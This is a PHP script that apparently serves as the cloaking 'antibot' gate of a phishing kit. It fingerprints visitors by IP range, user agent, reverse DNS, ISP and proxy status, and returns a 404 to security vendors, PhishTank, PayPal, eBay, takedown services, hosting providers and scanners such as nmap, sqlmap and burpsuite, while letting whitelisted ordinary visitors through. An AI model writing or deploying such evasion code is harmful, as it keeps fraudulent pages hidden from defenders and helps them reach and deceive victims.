<?php
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/check.php';

$isBot = false;

// ===== CLOUDFLARE-AWARE IP DETECTION =====
function getVisitorIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) return $client;
    if (filter_var($forward, FILTER_VALIDATE_IP)) return $forward;
    return $remote;
}

$visitor_ip = getVisitorIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$uaLower = strtolower($userAgent);

// ===== 1. BANNED IP RANGES (REGEX) =====
$bannedIpPatterns = [
    "^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*",
    "^74.125.*.*","^66.150.14.*","^54.176.*.*","^184.173.*.*","^66.249.*.*",
    "^128.242.*.*","^72.14.192.*","^208.65.144.*","^209.85.128.*","^216.239.32.*",
    "^207.126.144.*","^173.194.*.*","^64.233.160.*","^64.233.191.*","^66.102.*.*",
    "^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*",
    "^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.*","^62.90.*.*",
    "^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^93.172.*.*",
    "^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*",
    "^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^209.85.*.*",
    "^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*",
    "^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*",
    "^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*",
    "^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*",
    "^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*",
    "^12.148.209.*","^12.148.196.*","^193.220.178.*","^198.25.*.*","^64.106.213.*",
    "^94.26.*.*","^95.85.*.*","^72.52.96.*","^212.8.79.*","^62.99.77.*",
    "^83.31.118.*","^91.231.*.*","^206.207.*.*","^198.41.243.*","^162.158.*.*",
    "^173.245.55.*","^108.162.246.*","^108.162.215.*","^95.108.194.*","^141.101.104.*",
    "^93.54.82.*","^69.164.145.*","^194.153.113.*","^178.43.117.*","^62.141.65.*",
    "^83.31.69.*","^107.178.195.*","^85.9.7.*","^87.106.251.*","^107.178.194.*",
    "^124.66.185.*","^133.11.204.*","^185.2.138.*","^188.165.83.*","^78.148.13.*",
    "^192.232.213.*","^1.234.41.*","^176.195.231.*","^206.253.226.*","^107.20.181.*",
    "^188.244.39.*","^38.74.138.*","^104.131.223.*","^46.4.120.*","^198.60.236.*",
    "^217.74.103.*","^92.103.69.*","^66.211.160.*","^46.244.*.*","^131.*.*.*",
    "^157.*.*.*","^202.*.*.*","^204.*.*.*","^207.*.*.*","^219.*.*.*",
    "^63.*.*.*","^64.4.*.*","^65.52.*.*","^131.253.*.*","^157.54.*.*",
    "^207.46.*.*","^207.68.*.*","^8.12.*.*","^66.196.*.*","^66.228.*.*",
    "^67.195.*.*","^68.142.*.*","^72.30.*.*","^74.6.*.*","^98.136.*.*",
    "^202.160.*.*","^209.191.*.*","^154.16.*.*","^91.103.66.*","^208.91.115.*",
    "^199.30.228.*","^162.221.*.*","^93.119.227.*","^111.239.*.*","^185.191.34.*",
    "^185.100.87.*","^52.148.134.*","^52.65.88.*","^52.175.242.*","^77.74.177.*",
    "^213.44.27.*","^81.161.59.*","^66.135.200.*","^206.207.116.*","^188.166.63.*",
    "^194.99.106.*","^37.140.188.*",    "^195.128.227.*",
    "^2\.98\.96\.66$",
    "^86\.16\.74\.122$",
];

foreach ($bannedIpPatterns as $pattern) {
    if (preg_match('/' . $pattern . '/', $visitor_ip)) {
        $isBot = true;
        break;
    }
}

// ===== 2. IP BLACKLIST FILES =====
if (isBlacklisted($visitor_ip)) $isBot = true;

foreach (['bot.txt', 'banned_ip.txt'] as $f) {
    $path = __DIR__ . '/' . $f;
    if (file_exists($path)) {
        $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (in_array($visitor_ip, $lines)) { $isBot = true; break; }
    }
}

// ===== 3. USER-AGENT KEYWORDS (COMBINED) =====
$botKeywords = [
    'bot','crawler','spider','slurp','seek','yahoo','google','bing','msn','aol',
    'duckduckbot','baidu','yandex','antispam','dalvik','whatsapp','curl','wget',
    'facebookexternalhit','python','censys','axios','teoma','twiceler','gigabot',
    'ia_archiver','semrush','ahrefsbot','majestic12','dotbot','mozscape','seokicks',
    'exabot','backlinkcrawler','twitterbot','linkedinbot','pinterest','instagram',
    'vkshare','pingdom','uptimerobot','java','phantom','lighthouse','chromium',
    'serpstat','cloudflare','netcraft','sogou','feedfetcher','feedly','simplepie',
    'nmap','zgrab','shodan','nessus','okhttp','node-fetch','unirest',
    'archive.org_bot','adsbot-google','petalbot','turingos','dataprovider',
    'facebot','applebot','pingomatic','bitlybot','flipboard','discourse',
    'mediapartners','pricepi','shoppingbot','httrack','webcopy','webcapture',
    'screaming','postman','pa11y','lwp-trivial','perl','ruby','go-http-client',
    'php/','yisouspider','muckrack','researchscan','smtbot','kakaobot','qihoobot',
    'microsoft-office','pagepeeker','zoominfo','tiktok','mobile sdk',
    'appengine-google','apache-httpclient','restsharp','urlgrabber','feedparser',
    'universalfeedparser','rogerbot','semrushbot','mj12bot','netresearch',
    'netvibes','brandwatch','panscient','isspider','python-urllib','seoscanners',
    'scrapy','snacktory','zmeu','sqlmap','headlesschrome','puppeteer','selenium',
    'webdriver','phantomjs','playwright','cypress','nightwatch','nikto','acunetix',
    'netsparker','openvas','w3af','burpsuite','dirbuster','gobuster','wfuzz',
    'ffuf','nuclei','httpx','subfinder','amass','masscan','zmap','rustscan',
    'feroxbuster','katana','hakrawler','gospider','linkfinder','secretfinder',
    'paramspider','jetbrains','spam','windows 95','windows 98','007ac9','360spider',
    'lssrocketcrawler','urlresolver','lachesis','larbin','libwww','heritrix',
    'nutch','grub','robozilla','scooter','scoutjet','scrubby','grabber',
    'accoona','blackwidow','bloodhound','blo.','boitho','cfetch','charlotte',
    'deepindex','ebingbong','ejupiter','ferret','fetchrover','findlinks',
    'gcreep','geturl','golem','hamahakki','htmlgobble','incywincy','indexer',
    'informant','javabee','labelgrabber','linkscan','magpie','mattie','mercator',
    'minirank','mj12','mnogosearch','monster','muscatferret','nameprotect',
    'nomad','openfind','parasite','phpdig','plumtreewebaccessor','pompos',
    'psycheclone','rambler','robofox','sbider','semanticdiscovery','siphon',
    'snooper','speedfind','sphider','spyder','supersnooper','szukacz','tarantula',
    'titan','tkwww','twiceler','udmsearch','vagabondo','verticrawl','voyager/',
    'w3c_validator','webbandit','webcatcher','webfoot','weblayers','weblinker',
    'webmirror','webquest','webreaper','websitepulse','webstolperer','webvac',
    'webwalk','webwatch','webzinger','whizbang','worldlight','xenu','xget',
    'zyborg','Googlebot','bingbot','msnbot','PrintfulBot','MJ12bot','AhrefsBot',
    'Ezooms','YandexBot','SearchmetricsBot','QuerySeekerSpider','woriobot',
    'BazQuxBot','Kraken','SISTRIX','GrapeshotCrawler','PercolateCrawler',
    'SMXCrawler','PulseCrawler','80legs','Spinn3r','InAGist','NING','spbot',
    'Feedfetcher-Google','TencentTraveler',
];

foreach ($botKeywords as $keyword) {
    if (stripos($uaLower, strtolower($keyword)) !== false) {
        $isBot = true;
        break;
    }
}

if (empty($userAgent) || trim($userAgent) === '') $isBot = true;

// ===== 4. HTTP HEADERS =====
if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) $isBot = true;
if (!isset($_SERVER['HTTP_ACCEPT'])) $isBot = true;

// ===== 5. REVERSE DNS HOSTNAME =====
if (!$isBot) {
    $hostname = @gethostbyaddr($visitor_ip);
    if ($hostname && $hostname !== $visitor_ip) {
        $blockedHostnames = [
            'above','google','softlayer','amazonaws','cyveillance','phishtank',
            'dreamhost','netpilot','calyxinstitute','tor-exit','msnbot','p3pwgdsn',
            'netcraft','trendmicro','ebay','paypal','torservers','messagelabs',
            'sucuri.net','crawler','hetzner','ovh.net','digitalocean','linode',
            'vultr','scaleway','contabo','oracle','microsoft',
        ];
        foreach ($blockedHostnames as $word) {
            if (stripos($hostname, $word) !== false) {
                $isBot = true;
                break;
            }
        }
    }
}

// ===== 6. IP-API (ISP + PROXY + HOSTING + COUNTRY/ISP WHITELIST) =====
if (!empty($api_key) && !$isBot) {
    $ipinfo = @file_get_contents("https://pro.ip-api.com/json/{$visitor_ip}?fields=29617666&key={$api_key}");
    if ($ipinfo) {
        $ipdata = json_decode($ipinfo);
        $isp = $ipdata->isp ?? '';
        $as = $ipdata->as ?? '';
        $proxy = $ipdata->proxy ?? false;
        $hosting = $ipdata->hosting ?? false;
        $countryCode = $ipdata->countryCode ?? '';

        $org = $ipdata->org ?? '';
        $asname = $ipdata->asname ?? '';

        $isPrivateRelay = false;
        if (
            stripos($org, 'Cloudflare WARP') !== false ||
            stripos($org, 'iCloud Private Relay') !== false ||
            (stripos($asname, 'CLOUDFLARENET') !== false && ($proxy === true) && ($hosting === false))
        ) {
            $isPrivateRelay = true;
        }

        if (!$isPrivateRelay && ($proxy || $hosting)) $isBot = true;
        if (preg_match("/Cyberdefense/i", $isp)) $isBot = true;

        $bannedIsps = [
            'DigitalOcean','Amazon','Google','Microsoft','OVH','Hetzner','Vultr',
            'Linode','Contabo','Scaleway','Oracle','Alibaba','Cloudflare',
            'QuickPacket','EGIHosting','Yandex','SURF','Cogent','Host Europe',
            'QuadraNet','Leaseweb','Psychz','NetVirtue','Choopa',
            'Wholesale Internet','Hostinger','Alexhost','Vshield',
            'Sucuri','Malwarebytes','ESET','Bitdefender','Mcafee','Zscaler',
            'Avast','Sophos','Symantec','Webroot','Cylance','Trend Micro',
            'Kaspersky','Fortinet','Avira','Skypark','M247','Datacenter',
            'Palo Alto','Checkpoint','FireEye','Proofpoint','CrowdStrike',
            'F-Secure','Carbon Black','IBM Security','Armor','SentinelOne',
            'UpCloud','BuyVM','RamNode','DreamHost','SiteGround','Namecheap',
            'InMotion','A2 Hosting','NordVPN','ExpressVPN',
            'Private Internet Access','CyberGhost','HideMyAss','Hotspot Shield',
            'TOR Exit Node','Cisco Systems','Akamai','Incapsula',
            'Barracuda','SonicWall','Sharktech','PhishTank',
            'Norton Safe Web','McAfee SiteAdvisor','Comodo','Trustwave',
            'Krypt','Unitas Global','GLOBALCONNECT','SERVERD',
            'NTT Communications','Kddi Corporation','Charter Communications',
            'Top Level Hosting','B2 Net Solutions','ColoCrossing','SolarVPS',
            'Canalbox','HOSTWAY','FlokiNET','LogicWeb','Digital Energy',
            'CIA TRIAD','GMO Internet','NTT PC','Micfo','SoftLayer',
            'ART INVEST','ComClark','Owned-Networks','SYN LTD',
            'KHAKAS-NETWORKS','HostRoyale','1&1 IONOS','IP Volume',
            'Servers.com','iWeb Technologies','Online S.A.S','Internap',
            'CenturyLink','Mozilla Corporation','GSL Networks',
            'Pacswitch Globe','Sungard','Chinanet','China Telecom',
            'China Unicom','Forcepoint','Deutsche Telekom',
            'Adamo Telecom',
        ];

        if (!$isBot && !$isPrivateRelay) {
            foreach ($bannedIsps as $b) {
                if (stripos($isp, $b) !== false || stripos($as, $b) !== false) {
                    $isBot = true;
                    break;
                }
            }
        }

        if (!empty($countryCode)) $_SESSION['country'] = $countryCode;

        // Country whitelist only
        $iniFile = __DIR__ . '/whitelist.ini';
        if (!$isBot && file_exists($iniFile)) {
            $ini = parse_ini_file($iniFile, true);
            $allowedCountries = $ini['countries']['country'] ?? [];

            if (!empty($allowedCountries) && !in_array($countryCode, $allowedCountries)) {
                $isBot = true;
            }
        }
    }
}

// ===== BLOCK =====
if ($isBot) {
    http_response_code(404);
    die();
}

// ===== COUNTRY FALLBACK (free ip-api when no pro key was used) =====
if (empty($_SESSION['country'])) {
    $geoResp = @file_get_contents("http://ip-api.com/json/{$visitor_ip}?fields=countryCode");
    if ($geoResp) {
        $geoData = json_decode($geoResp, true);
        if (!empty($geoData['countryCode'])) $_SESSION['country'] = $geoData['countryCode'];
    }
    if (empty($_SESSION['country'])) $_SESSION['country'] = 'XX';
}
?>
